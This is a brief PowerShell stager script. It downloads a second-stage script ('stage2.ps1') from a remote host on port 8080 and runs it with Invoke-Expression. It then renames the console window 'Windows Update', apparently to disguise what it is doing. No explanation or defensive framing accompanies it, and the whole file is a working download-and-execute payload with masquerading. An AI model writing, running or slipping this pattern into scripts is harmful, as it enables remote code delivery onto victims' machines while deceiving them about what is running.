[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://contoso.com:8080/stage2.ps1",
    [int]$TransferTimeout = 103
)
IEX (Invoke-WebRequest -Uri $RemoteUrl -UseBasicParsing).Content
$Host.UI.RawUI.WindowTitle = "Windows Update"
